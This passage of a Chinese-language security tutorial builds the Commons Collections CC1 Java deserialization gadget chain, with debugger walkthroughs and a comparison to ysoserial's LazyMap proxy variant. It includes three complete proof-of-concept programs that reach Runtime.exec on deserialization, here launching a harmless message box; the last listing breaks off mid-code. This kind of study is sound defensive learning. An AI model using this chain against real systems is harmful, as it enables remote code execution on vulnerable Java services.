<p>到这一步基本的雏形已经完成了，但是有一个地方会有问题，我们可以调试一下，我们最终需要调用的是<code>AnnotationInvocationHandler.readObject</code>里的setValue，流程为<br>setValue-&gt;checkSetValue-&gt;transform<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671128250968-8e83a4aa-f23d-4aa4-bb68-471370bfcb96.png#averageHue=%232d2d2c&clientId=u912540b4-cebc-4&from=paste&height=139&id=u90d2e402&name=image.png&originHeight=174&originWidth=736&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18426&status=done&style=none&taskId=u9c909e19-1361-4ef9-9dcf-6a9af70a3af&title=&width=588.8" alt="image.png"><br>这里的valueTransformer其实就是等价于传入的那个map<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671128297887-3d3719c8-79e2-4fc5-b6ac-0544f9ca6ddc.png#averageHue=%232e2d2c&clientId=u912540b4-cebc-4&from=paste&height=122&id=uea821af4&name=image.png&originHeight=153&originWidth=1160&originalType=binary&ratio=1&rotation=0&showTitle=false&size=23444&status=done&style=none&taskId=uc158f491-1388-43f0-9020-754cb2a0e7f&title=&width=928" alt="image.png"><br>也就是chaintransformer，因此可以做出雏形CC链：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot; mshta vbscript:msgbox(\&quot;恭喜你成功完成CC1！\&quot;,64,\&quot;Congratulations！\&quot;)(window.close)&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;bbb&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Override.class, transformedmap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>进行调试一下可以发现：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671128416278-b4d198da-97d5-4936-aaa8-a838688d71ed.png#averageHue=%23302b2a&clientId=u912540b4-cebc-4&from=paste&height=255&id=uf4300204&name=image.png&originHeight=319&originWidth=1388&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85009&status=done&style=none&taskId=u4b82f707-70ed-4c83-8f0e-99edaa034e7&title=&width=1110.4" alt="image.png"><br>这是<code>AnnotationInvocationHandler</code>中的readObject，可以看到要调用setValue，需要通过2个if判断，第一个是判断memberType是否为空，memberType是什么呢？<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671128495112-92d99a04-97b4-4645-a715-d3ee56309e25.png#averageHue=%232e2d2d&clientId=u912540b4-cebc-4&from=paste&height=77&id=u57ff3974&name=image.png&originHeight=96&originWidth=1323&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14600&status=done&style=none&taskId=u797b018b-c052-4fda-9205-b7d3a09e46b&title=&width=1058.4" alt="image.png"><br><code>annotationType.memberTypes();</code>跟进<code>annotationType</code>：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671128610474-c35d4741-ee8b-401e-ba1f-d344f4550961.png#averageHue=%232f2d2c&clientId=u912540b4-cebc-4&from=paste&height=123&id=u0dca2284&name=image.png&originHeight=154&originWidth=872&originalType=binary&ratio=1&rotation=0&showTitle=false&size=31159&status=done&style=none&taskId=u8108f210-0303-42bc-908f-787a5a71aba&title=&width=697.6" alt="image.png"><br>获得了实例<code>type</code>，跟进type：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671128640031-3ef90081-9327-4641-8d97-1c0781b5e112.png#averageHue=%232d2c2c&clientId=u912540b4-cebc-4&from=paste&height=214&id=u790844ba&name=image.png&originHeight=268&originWidth=1183&originalType=binary&ratio=1&rotation=0&showTitle=false&size=45999&status=done&style=none&taskId=u598413a8-be3d-41a3-90b0-71d10ba7566&title=&width=946.4" alt="image.png"><br>可以看到其实就是我们初始化传入的注解<img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671128694565-f41425c4-c0af-42fe-a243-370c35622a35.png#averageHue=%2371604a&clientId=u912540b4-cebc-4&from=paste&height=137&id=u8ea7b9d0&name=image.png&originHeight=171&originWidth=1293&originalType=binary&ratio=1&rotation=0&showTitle=false&size=49044&status=done&style=none&taskId=ubb74de13-b67f-4315-8898-89e06950370&title=&width=1034.4" alt="image.png"><br>在做判断前先获取了memberValue的key值，memberValue其实也就是我们传入的那个Map<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671128759693-d657fbc2-beae-41b3-9ff4-75ac55443cae.png#averageHue=%232d2c2b&clientId=u912540b4-cebc-4&from=paste&height=300&id=uecaaf584&name=image.png&originHeight=375&originWidth=1232&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79203&status=done&style=none&taskId=u324a0771-5d72-4714-b6b3-2920485944a&title=&width=985.6" alt="image.png"><br>我们在代码中，向Map中put了一个键值对<code>bbb-&gt;aaa</code>，首先获取了key<code>bbb</code>，然后在注解中获取这个属性<code>bbb</code>，但是override注解是没有属性的：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671128863858-835ae09d-0978-4c4a-944f-711de50def53.png#averageHue=%232d2d2c&clientId=u912540b4-cebc-4&from=paste&height=158&id=udd32c112&name=image.png&originHeight=198&originWidth=812&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24505&status=done&style=none&taskId=u21e8a7df-0bbd-4a76-900c-77c2ac4b685&title=&width=649.6" alt="image.png"><br>因此得换一个注解，比如Target：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671128878376-b3046caf-99c6-409e-8e84-4145d6843b64.png#averageHue=%232c2c2c&clientId=u912540b4-cebc-4&from=paste&height=168&id=u18051de0&name=image.png&originHeight=210&originWidth=1228&originalType=binary&ratio=1&rotation=0&showTitle=false&size=25390&status=done&style=none&taskId=u90443dd8-05b8-4ee7-8fb0-11451da6132&title=&width=982.4" alt="image.png"><br>更换之后再调试一次，发现还是null，因为Target注解虽然有属性，但是没有bbb属性啊，因此我们往Map里put键值对时，key有讲究，Target有value属性，因此把key改成value：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671128941805-1c1cc0e1-4911-4dfe-8b5e-2f8afae0cdb1.png#averageHue=%23302b2a&clientId=u912540b4-cebc-4&from=paste&height=366&id=u4cc89db2&name=image.png&originHeight=458&originWidth=1442&originalType=binary&ratio=1&rotation=0&showTitle=false&size=113803&status=done&style=none&taskId=u65d48e7b-184a-4d7b-bfc7-4badf198c35&title=&width=1153.6" alt="image.png"><br>可以看到两个if顺利通过，并且调用setValue方法，最终一个难题来了，就是如何让他调用Runtime.class呢？，因为递归的入口在上面已经分析过了就是Runtime.class类，这里就又要在最初Transfomer类去找了，可以发现<code>ConstantTransformer</code>类：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671129493170-a70a5920-c4be-489b-961c-bd6bced7f566.png#averageHue=%232e2d2c&clientId=u912540b4-cebc-4&from=paste&height=115&id=u63982ea6&name=image.png&originHeight=144&originWidth=889&originalType=binary&ratio=1&rotation=0&showTitle=false&size=17860&status=done&style=none&taskId=ub5fb88c8-e2ab-4184-8036-e8cc5171f81&title=&width=711.2" alt="image.png"><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671129497398-4898eeef-6cb7-4d03-bcfa-ab195fa40e54.png#averageHue=%232e2d2c&clientId=u912540b4-cebc-4&from=paste&height=114&id=ua2637208&name=image.png&originHeight=142&originWidth=961&originalType=binary&ratio=1&rotation=0&showTitle=false&size=14697&status=done&style=none&taskId=uded65d45-65f9-4f3d-a214-82998a59d8e&title=&width=768.8" alt="image.png"><br>它里面的transform就是返回我们传入的对象，如果我们传入Runtime.class，那返回的也即是Runtime.class，因此最终链确定了：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot; mshta vbscript:msgbox(\&quot;恭喜你成功完成CC1！\&quot;,64,\&quot;Congratulations！\&quot;)(window.close)&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap = TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span>  annotationconstructor.newInstance(Target.class, transformedmap);</span><br><span class="line"></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>最终成功调用：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671129574131-16b8d888-8fd3-499e-bec8-2f8d218a8f04.png#averageHue=%23474645&clientId=u912540b4-cebc-4&from=paste&height=340&id=u07bb7241&name=image.png&originHeight=425&originWidth=1164&originalType=binary&ratio=1&rotation=0&showTitle=false&size=70560&status=done&style=none&taskId=u4c65e290-99df-4511-bea1-859949d8d88&title=&width=931.2" alt="image.png"><br>成功弹窗！可以调试分析一下刚刚的判断：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671129597964-3710542e-6830-43f3-aac8-526c95df25ba.png#averageHue=%232f2b2b&clientId=u912540b4-cebc-4&from=paste&height=314&id=u63e2fa9a&name=image.png&originHeight=392&originWidth=1476&originalType=binary&ratio=1&rotation=0&showTitle=false&size=108223&status=done&style=none&taskId=u5ecfcfb6-862f-4691-9665-18ee3f4e48b&title=&width=1180.8" alt="image.png"><br>2个if判断都通过了，进入setvalue方法：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671129610587-04c86765-d542-4b91-8158-a86b19ed5f7f.png#averageHue=%23585145&clientId=u912540b4-cebc-4&from=paste&height=491&id=uadad1212&name=image.png&originHeight=614&originWidth=1447&originalType=binary&ratio=1&rotation=0&showTitle=false&size=109305&status=done&style=none&taskId=u145d8362-94fd-4ad3-a335-e084c028f14&title=&width=1157.6" alt="image.png"><br>调用<code>AbstractInputCheckedMapDecorator</code>的setValue方法，进而调用checksetValue：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671129749864-55df003f-fceb-4bf2-8783-de5e0eee97ce.png#averageHue=%232c2b2b&clientId=u912540b4-cebc-4&from=paste&height=166&id=u8c9aabe9&name=image.png&originHeight=208&originWidth=1332&originalType=binary&ratio=1&rotation=0&showTitle=false&size=37309&status=done&style=none&taskId=u936fa05c-d4e9-47bf-8e08-6185ba0de3c&title=&width=1065.6" alt="image.png"><br>继续调用chainedtransformer的transform方法：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671129790808-23e98400-e59c-4365-b31a-994aafaac833.png#averageHue=%23554f43&clientId=u912540b4-cebc-4&from=paste&height=350&id=u9e659ad8&name=image.png&originHeight=438&originWidth=1515&originalType=binary&ratio=1&rotation=0&showTitle=false&size=90561&status=done&style=none&taskId=u668dc74d-acf8-4df5-a98c-10dc10ad704&title=&width=1212" alt="image.png"><br>之后就是进行一系列的递归，最终调用<code>Runtime.getRuntime().exec</code>，完美收工</p>
<h3 id="1X2-1-3-对比Ysoserial的CC1"><a href="#1X2-1-3-对比Ysoserial的CC1" class="headerlink" title="1X2.1.3 对比Ysoserial的CC1"></a>1X2.1.3 对比Ysoserial的CC1</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671129885817-77bcab43-8623-4ef0-93f0-50bb6bd28d81.png#averageHue=%23fefefe&clientId=u912540b4-cebc-4&from=paste&height=433&id=u7fdf7a4f&name=image.png&originHeight=541&originWidth=1755&originalType=binary&ratio=1&rotation=0&showTitle=false&size=43948&status=done&style=none&taskId=u815dc13b-1fec-4015-b7ef-ee9c09e29fb&title=&width=1404" alt="image.png"><br>Ysoserial的调用链与我们的高度相似，唯一不同的就是<code>LazyMap.get()</code>，我们使用的是<code>TransformedMap.checkSetValue</code>,但是这两个方法最终调用的都是transform方法：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671129950826-7930705c-7c70-4213-92fd-34f40d7478c9.png#averageHue=%232e2d2d&clientId=u912540b4-cebc-4&from=paste&height=98&id=u5007d003&name=image.png&originHeight=122&originWidth=839&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15330&status=done&style=none&taskId=u680b184d-5847-4e9a-a70b-b52d0abdbba&title=&width=671.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671129976686-a37ba50a-3c47-439d-b3b7-f873eb80c43d.png#averageHue=%232d2c2c&clientId=u912540b4-cebc-4&from=paste&height=206&id=ue76227f5&name=image.png&originHeight=258&originWidth=1210&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39783&status=done&style=none&taskId=u37b483dd-faba-4e1c-bf5c-17ad08636eb&title=&width=968" alt="image.png"><br>还有就是开头一段：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671163980919-4b6a8d45-d961-4158-8efd-f83e53317b0d.png#averageHue=%23fefefd&clientId=u799e0b79-b94f-4&from=paste&height=146&id=uac05c5a9&name=image.png&originHeight=182&originWidth=766&originalType=binary&ratio=1&rotation=0&showTitle=false&size=12731&status=done&style=none&taskId=ucbe2e57f-ef5c-43b0-88a6-6adfaed749c&title=&width=612.8" alt="image.png"><br>可以看到调用了AnnotationInvocationHandler的invoke方法：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1671164002474-c3c73a02-8896-492c-b0af-06d481e7fe53.png#averageHue=%23718162&clientId=u799e0b79-b94f-4&from=paste&height=127&id=u04f92130&name=image.png&originHeight=159&originWidth=1001&originalType=binary&ratio=1&rotation=0&showTitle=false&size=18786&status=done&style=none&taskId=u35e75068-676a-4d1e-a1bb-3c8da11394b&title=&width=801" alt="image.png"><br>是一个动态代理，我们把Annotationinvocationhandler用proxy包裹，再包裹进Map数组，就可以调用invoke方法，和一开始讲的动态代理是一个意思</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers=<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot; mshta vbscript:msgbox(\&quot;恭喜你成功完成CC1！\&quot;,64,\&quot;Congratulations！\&quot;)(window.close)&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">annotationconstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        annotationconstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) annotationconstructor.newInstance(Override.class, lazymap);</span><br><span class="line">        <span class="comment">//生成动态代理</span></span><br><span class="line">        Map mapproxy= (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,handler);</span><br><span class="line">        <span class="comment">//生成最外层</span></span><br><span class="line">        <span class="type">Object</span> <span 